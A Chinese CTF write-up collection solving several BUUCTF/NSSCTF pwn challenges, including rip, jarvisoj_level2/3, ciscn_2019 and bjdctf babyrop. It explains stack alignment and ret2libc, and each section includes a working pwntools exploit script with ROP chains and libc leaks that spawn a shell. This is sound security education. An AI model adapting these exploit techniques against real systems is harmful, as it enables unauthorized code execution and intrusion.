# buuctf[PWN]

## 题目：rip(栈对齐)

### 知识点：栈对齐

1. 题目地址：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#rip)
2. 知识点：64位ubuntu18以上系统调用system函数时需要栈对齐，因为**64位**下的system函数有个**movaps指令**，这个指令要求内存地址(ebp)必须**16字节对齐**，如果内存地址没有对齐会停止在该指令处。![image-20240506205321177](https://s2.loli.net/2024/05/06/YB2FdzDgWq937IC.png)
3. 但是将rbp按**16字节对齐**(保证rbp的值最后一位时**0**即可)后即可通过：![image-20240506205312385](https://s2.loli.net/2024/05/06/guvleOPHDmWSLa6.png)
4. 为什么rbp最后一位是**0**即可保证对齐：在64位的系统中**内存地址**按**8字节**编排，而十六进制满16进位，所以内存中的所有编排的地址**最后一位**都是**0**或**8**(一个格子放8字节即**64bit**的数据)，所以要使栈按**16字节对齐**，那**rbp的值最后一位**必须是**0**。

### 题解：

1. ida进入程序：发现gets这漏洞函数，然后再fun函数中发现调用了system("/bin/sh")，直接栈溢出返回妇fun函数的地址**0x401186**即可。

![image-20240506205303643](https://s2.loli.net/2024/05/06/MwJaCKERkAsf2qv.png)

![image-20240506205255975](https://s2.loli.net/2024/05/06/3xcMqGwZbJitQWI.png)

2. 计算栈溢出的地址：这个函数的地址需要在前面填入15+8个垃圾数据(为什么这么计算后面再出教程吧)，然后写入fun函数地址。![image-20240506205246664](https://s2.loli.net/2024/05/06/DRzsEWai6kvO25Q.png)
3. 脚本：

``````python
from pwn import *
 
p = remote('node5.buuoj.cn',26058)#建立连接

payload = b'a'*(15+8)+p64(0x401186)
p.sendline(payload)
p.interactive()
``````



4. 运行脚本会发现此路不通，原因就上上面将的栈对齐。：![image-20240506205237573](https://s2.loli.net/2024/05/06/47xTrlQWiLmuHoY.png)
5. 在本地调试该程序会发现在调用**system("/bin/sh")**时会在**movaps ++，xmm指令**处停止，无法继续，这是一位xmm寄存器调用时要求栈必须按**16字节**对齐。[movaps](https://c9x.me/x86/html/file_module_x86_id_180.html)![image-20240506205227200](https://s2.loli.net/2024/05/06/tgIJvSO1FhX5T8W.png)
6. **当源操作数或目标操作数是内存操作数时，该操作数必须对齐在16字节边界上，否则会引发一般保护异常（#GP）**：所以要保证栈在16字节上对齐，这里就要在脚本上稍作修改，让栈的操作(pop\push)少操作一步，相当于**rsp + or -8字节**，跳过fun函数开头的push即可让调用system函数时完成栈在16字节上对齐，而且不将rbp压栈(跳过该指令)，不会对system函数的调用造成影响（在后面调用函数时生成**栈帧**时会细讲）。![image-20240506205615055](https://s2.loli.net/2024/05/06/6uOtbY7zkgnZKI2.png)
7. 改后脚本：

``````python
from pwn import *
 
p = remote('node5.buuoj.cn',28455)

payload = b'a'*(15+8)+p64(0x401186+1)
p.sendline(payload)
p.interactive()

``````

8. ![image-20240506205802200](https://s2.loli.net/2024/05/06/iZd38gPabAj1uwl.png)
9. flag=**flag{4bf61dbe-129f-460e-914a-96ee9ab54ac8}**

## [NSSCTF 2022 Spring Recruit]R3m4ke?

1. 题目地址：[[NSSCTF 2022 Spring Recruit\]R3m4ke? | NSSCTF](https://www.nssctf.cn/problem/2141)

2. 打开附件：又是gets函数，栈溢出。

   ![image-20240506205144293](https://s2.loli.net/2024/05/06/Erli9bQMVNtceZ8.png)

3. 找到v4的栈：垃圾数据填充为32+8。

   ![image-20240506205046088](https://s2.loli.net/2024/05/06/SPAK9Gtxv1fI8i2.png)

4. 攻击脚本：

``````python
from pwn import *
 
p = remote('node4.anna.nssctf.cn',28276)

payload = b'a'*(32+8)+p64(0x40072C)
p.sendline(payload)
p.interactive()
``````



## [watevrCTF 2019]Voting Machine 1

1. 题目地址：[[watevrCTF 2019]Voting Machine 1](https://www.nssctf.cn/problem/85)
2. 目标函数：**super_secret_function函数**地址0x400807。![image-20240506205503883](https://s2.loli.net/2024/05/06/iKLVQBXfDMEARhw.png)
3. main函数中gets栈溢出。![image-20240506205513867](https://s2.loli.net/2024/05/06/jgDzPr4JkfGTtwp.png)
4. v4栈，垃圾数据填充**2+8**个字节：
5. 攻击脚本：

``````python
from pwn import *
 
p = remote('node5.anna.nssctf.cn',20703)

payload = b'a'*(2+8)+p64(0x400807)
p.sendline(payload)
p.interactive()

``````

## jarvisoj_level2

1. [jarvisoj_level2]([BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#jarvisoj_level2))
2. ida打开：read函数度**0x100**这么长，必存在栈溢出。![image-20240506223846392](https://s2.loli.net/2024/05/06/xiMPvmEHWsfdZOG.png)
3. 使用该函数，手动传入**bin/sh**参数，来达到system("/bin/sh")的目的：![image-20240506223947917](https://s2.loli.net/2024/05/06/AvZdSIXPjz1kFeQ.png)
4. 首先要跳转到该函数处：地址**0x8048320**，然后为其传入参数**/bin/sh**地址**804A024**(任然用栈传参)。![image-20240506224122097](https://s2.loli.net/2024/05/06/OKGeBfnNsTmP8py.png)

![image-20240506224221091](https://s2.loli.net/2024/05/06/5ILdMU3imohZ9Qu.png)

5. 用栈传参的原因：观察main函数中调用system函数时：参数传递的是利用push将变量的地址入栈，再使用call指令调用system。![image-20240506224336994](https://s2.loli.net/2024/05/06/WFMIsyNSkGzLKul.png)
6. 分析到这里有两种解法：
   * 直接使用main函数中的**call system**指令，只需要在调用前阿静参数入栈即可：攻击脚本，这是不需要手动填充**call**调用时的**返回值**问题。

``````python
from pwn import *
 
p = remote('node5.buuoj.cn',25955)

payload = b'a'*(136+4)+p32(0x804849E)+p32(0x804A024)
p.sendline(payload)
p.interactive()

``````

7. 第二种

   * 调用system函数，此时需要**手动填充**因没有使用**call指令**而产生的栈缺失问题(如果不补充，则咱进入system函数内部时，变量**/bin/sh**所在的栈空间与**system原来使用的变量**空间会不匹配)(后面将**函数栈帧**的时候一起讲把)：![image-20240506224927124](https://s2.loli.net/2024/05/06/uQwKgkAEz3mCtB6.png)

   * ``````
     from pwn import *
     p = remote('node5.buuoj.cn',27535)
     
     #加上p32(0)相当于进行了依次压栈操作，但是压入的数据无所谓只需要把system返回地址的32bit填满即可
     payload = b'a'*(136+4)+p32(0x8048320)+p32(0)+p32(0x804A024)
     #payload = b'a'*(136+4)+p32(0x8048320)+b'a'*4+p32(0x804A024)
     p.sendline(payload)
     p.interactive()
     
     ``````

   * ![image-20240506231806934](https://s2.loli.net/2024/05/06/1DfKoGUhlawOLZC.png)



## ciscn_2019_n_5

#### 注意：

1. 栈平衡。

1. 没有system函数，bin/sh/字符串，考虑ret2libc

   ![image-20240530194139000](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405301941063.png)

2. 利用gets函数溢出，劫持puts函数，拿到puts函数的地址，进而获取libc的基地址，再计算system和str_bin_sh的地址，最后构造ROP，注意64位直接跳转system是小心栈平衡的问题

   ``````python
   from pwn import *
   from LibcSearcher import *
   context(os='linux', arch='amd64', log_level='debug')
   #获取got，plt，main地址
   p=remote("node5.buuoj.cn",28254)
   elf=ELF('./ciscn_2019_n_5')
   got = elf.got['puts']
   plt = elf.plt['puts']
   main_addr = elf.sym['main']
   print(hex(got),hex(plt))
   #使用pop_rdi_ret传参
   pop_rdi_ret = 0x400713
   payload = b'a'*(0x20+8)+p64(pop_rdi_ret)+p64(got)+p64(plt)+p64(main_addr)
   
   p.recvuntil(b"tell me your name\n")
   p.sendline(b'1')
   p.recvuntil(b"What do you want to say to me?\n")
   #拿到puts函数的地址
   p.sendline(payload)
   addr = u64(p.recvuntil(b'\x7f').ljust(8,b'\x00'))
   print(hex(addr))
   p.recv()
   p.sendline(b'1')
   p.recvuntil(b'me?\n')
   #计算基地址，和system和str_bin_sh的地址
   libc = LibcSearcher('puts',addr)
   libcbase = addr - libc.dump('puts')
   sys_addr = libcbase + libc.dump('system')
   str_sh   = libcbase + libc.dump('str_bin_sh')
   print(hex(sys_addr),hex(str_sh))
   
   #构造ROP栈溢出拿到shell，注意栈对齐问题，随便加一个ret指令的地址填充一下栈空间
   payload = b'a'*(0x20+8)+p64(0x4004c9)+p64(pop_rdi_ret)+p64(str_sh)+p64(sys_addr)
   p.sendline(payload)
   p.sendline(b'cat flag')
   p.interactive()
   
   ``````

   ![image-20240530194854475](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405301948539.png)

## not_the_same_3dsctf_2016

#### 注意：

1. 缓冲区的刷新控制。

1. gets函数存在栈溢出，其次 **没有setvbuf函数** 刷新缓存区，导致 **printf函数输出** 的内容没有有效返回(暂存再缓冲区，只有当fflush或者程序退出exit时才会刷新缓冲区)。

   ![image-20240530202946944](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405302029997.png)

2. 后门函数get_secret，读取了flag文件，写入到 **全局变量fl4g** ，要想办法输出fl4g处的字符串，拿到flag。

   ![image-20240530203044539](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405302030591.png)

3. 思路：首先栈溢出到 **get_secret函数** 读取flag.txt文件中的内容，放到 **全局变量fl4g** ，接着利用printf函数输出fl4g处的字符串：

   ``````python
   from pwn import *
   
   # 设置系统架构, 打印调试信息
   # arch 可选 : i386 / amd64 / arm / mips
   context(os='linux', arch='amd64', log_level='debug')
   p = remote("node5.buuoj.cn",'25773')
   elf = ELF('./not_the_same_3dsctf_2016')
   get_secret = elf.sym['get_secret']
   printf_addr = elf.sym['printf']
   exit_addr = elf.sym['exit']
   print(hex(get_secret),hex(printf_addr),hex(exit_addr))
   
   #加上exit_addr让程序结束，向终端回显
   payload = b'a'*0x2d+p32(get_secret)+p32(printf_addr)+p32(exit_addr)+p32(0x080ECA2D)
   p.sendline(payload)
   
   # 与远程交互，显示程序输出
   p.interactive()
   
   ``````

   

## ciscn_2019_en_2

1. main中只能进入encrypt，里面gets函数存在栈溢出，由于没有system和bin/sh，所以考虑ret2libc。

   ![image-20240530213813644](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405302138702.png)

2. EXP：

   ``````python
   from pwn import *
   from LibcSearcher import *
   # 设置系统架构, 打印调试信息
   # arch 可选 : i386 / amd64 / arm / mips
   context(os='linux', arch='amd64', log_level='debug')
   p = remote("node5.buuoj.cn",'27301')
   elf = ELF('./ciscn_2019_en_2')
   #获取got、plt地址
   got = elf.got['puts']
   plt = elf.plt['puts']
   print(hex(got),hex(plt))
   #获取传参地址
   pop_rdi_ret = 0x400c83
   #获取返回地址，便于下一次利用栈溢出
   main_addr = 0x400B28
   ret = 0x00000000004006b9
   p.recvuntil(b'Input your choice!\n')
   p.sendline(b'1')
   p.recvuntil(b'Input your Plaintext to be encrypted\n')
   #构造payload，获得puts函数的地址
   payload = b'a'*(0x50+8)+p64(pop_rdi_ret)+p64(got)+p64(plt)+p64(main_addr)
   p.sendline(payload)
   p.sendline(b'1')
   addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
   print(hex(addr))
   libc = LibcSearcher('puts',addr)
   libc_base = addr - libc.dump('puts')
   sys_addr = libc_base + libc.dump('system')
   str_bin = libc_base + libc.dump('str_bin_sh')
   print(hex(libc_base),hex(sys_addr),hex(str_bin))
   
   #第二次利用栈溢出
   p.recvuntil(b'Input your choice!\n')
   payload = b'a'*(0x50+8)+p64(ret)+p64(pop_rdi_ret)+p64(str_bin)+p64(sys_addr)
   p.sendline(payload)
   p.sendline(b'cat flag')
   # 与远程交互
   p.interactive()
   
   ``````


## [bjdctf_2020_babyrop](https://buuoj.cn/challenges#bjdctf_2020_babyrop)

1. 进main函数没有system后门，有栈溢出，典型的ret2libc题目：

   ``````python
   from pwn import *
   from LibcSearcher import *
   
   context(os='linux', arch='amd64', log_level='debug')
   
   p=remote("node5.buuoj.cn",29053)
   elf=ELF('./bjdctf_2020_babyrop')
   got = elf.got['puts']
   plt = elf.plt['puts']
   main_addr = 0x4006AD
   print(hex(got),hex(plt))
   
   pop_rdi_ret = 0x400733
   ret_addr = 0x4004c9
   payload = b'a'*(0x20+8)+p64(pop_rdi_ret)+p64(got)+p64(plt)+p64(main_addr)
   
   p.recv()
   p.sendline(payload)
   
   addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
   print(hex(addr))
   
   
   libc = LibcSearcher('puts',addr)
   libcbase = addr - libc.dump('puts')
   print("libcbase:",hex(libcbase))
   sys_addr = libcbase + libc.dump('system')
   str_sh   = libcbase + libc.dump('str_bin_sh')
   print(hex(sys_addr),hex(str_sh))
   
   payload = b'a'*(0x20+8)+p64(ret_addr)+p64(pop_rdi_ret)+p64(str_sh)+p64(sys_addr)
   p.sendline(payload)
   p.sendline(b'cat flag')
   p.interactive()
   
   
   ``````

   ![image-20240601155719740](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406011557824.png)

## [picoctf_2018_rop chain](https://buuoj.cn/challenges#picoctf_2018_rop chain)

1. 注意点，程序调用时 **参数** 与 **函数返回值** 在栈上存放的位置。

2. main函数中给了一个栈溢出，程序由后门函数flag，但是条件是 **( win1 && win2 && a1 == 0xDEADBAAD )** ，全局变量win1、win2可以通过程序给的函数调用赋值，a1需要通过栈传递参数。

   ![image-20240603145100229](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406031451291.png)

   ![image-20240603145114756](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406031451841.png)

3. 两个全局变量赋值函数win_function1和win_function2，重点观察win_function2，他的参数a1在栈上的位置（看汇编）可以看到偏移 **arg_0** 为+8，即相对于bp往后8位，flag中a1的参数同理：

   ![image-20240603145207427](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406031452503.png)

   ![image-20240603145309893](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406031453962.png)

   ![image-20240603145213405](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406031452455.png)

4. EXP，进入win_function2函数后bp寄存器会指向 **win_function2**所在的地址bp+8刚好指向 *8win_function2_num**，flag函数中同理：

   ```python
   from pwn import *
   from LibcSearcher import *
   
   context(os='linux', arch='amd64', log_level='debug')
   
   p=remote("node5.buuoj.cn",29642)
   elf = ELF('./PicoCTF_2018_rop_chain')
   p.recvuntil(b'Enter your input> ')
   win_function1 = 0x080485CB
   win_function2 = 0x080485D8
   win_function2_num = 0xBAAAAAAD
   flag = 0x0804862B
   flag_num = 0xDEADBAAD
   #其中flag是win_function函数调用后的返回值
   payload = b'a'*(0x18+4)+p32(win_function1)+p32(win_function2)+p32(flag)+p32(win_function2_num)+p32(flag_num)
   
   p.sendline(payload)
   p.interactive()
   ```

   ![image-20240603145643830](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406031456916.png)

## [jarvisoj_level3](https://buuoj.cn/challenges#jarvisoj_level3)

1. 栈溢出，正常的ret2libc：

   ![image-20240603161800842](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406031618909.png)

2. EXP：

   ```python
   from pwn import *
   from LibcSearcher import *
   
   context(os='linux', arch='amd64', log_level='debug')
   
   p=remote("node5.buuoj.cn",25516)
   elf=ELF('./level3')
   libc = ELF('./libc-2.23.so')
   got = elf.got['write']
   plt = elf.plt['write']
   print(hex(got),hex(plt))
   main_addr = 0x0804844B
   
   p.recvuntil(b'Input:\n')
   payload = b'a'*(0x88+4)+p32(plt)+p32(main_addr)+p32(1)+p32(got)+p32(8)
   p.sendline(payload)
   addr = u32(p.recvuntil(b'\xf7'))
   print(hex(addr))
   
   #libc = LibcSearcher('printf',addr)
   libc_base = addr - libc.sym['write']
   sys_addr = libc_base + libc.sym['system']
   sh_addr = libc_base + next(libc.search(b'/bin/sh'))
   print(hex(libc_base),hex(sys_addr),hex(sh_addr))
   
   p.recvuntil(b'Input:\n')
   payload = b'a'*(0x88+4)+p32(sys_addr)+p32(0x0804844B)+p32(sh_addr)
   p.sendline(payload)
   
   p.sendline(b'cat flag')
   p.interactive()
   
   ```

   ![image-20240603161838389](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406031618503.png)
